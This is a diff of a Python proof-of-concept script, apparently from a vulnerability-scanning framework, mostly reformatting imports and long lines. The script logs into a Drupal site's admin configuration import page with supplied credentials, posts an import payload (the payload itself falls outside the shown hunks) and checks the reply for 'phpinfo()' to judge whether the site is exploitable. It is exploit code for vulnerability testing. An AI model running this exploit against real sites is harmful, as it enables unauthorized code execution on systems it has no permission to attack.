@@ -1,18 +1,24 @@
-from lib.core.data import target
-import requests
 import re
+
+import requests
+
+from lib.core.data import target
 
 
 def poc():
     try:
         if not target.url.endswith("configuration/single/import/"):
-            print("[*] Please make sure the url end with 'admin/config/development/configuration/single/import/'")
+            print(
+                "[*] Please make sure the url end with 'admin/config/development/configuration/single/import/'"
+            )
             exit()
         # log in
 
         username = raw_input("[*] Input the admin username: ")
         password = raw_input("[*] Input the admin password: ")
-        loginurl = target.url.replace("admin/config/development/configuration/single/import/", "user/login")
+        loginurl = target.url.replace(
+            "admin/config/development/configuration/single/import/",
+            "user/login")
         print("[*] The login url: " + loginurl)
 
         # get form-id
@@ -59,11 +65,13 @@ def poc():
             "op": "Import"
         }
 
-        exphtml = requests.post(target.url, data=payload2, cookies=logincookie).text
+        exphtml = requests.post(
+            target.url, data=payload2, cookies=logincookie).text
         if exphtml.find("phpinfo()") > 0:
             print("[*] The site is vulnable!")
-            print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
         else:
             raise KeyError
     except KeyError as e:
-        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
+        print(
+            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
+        )
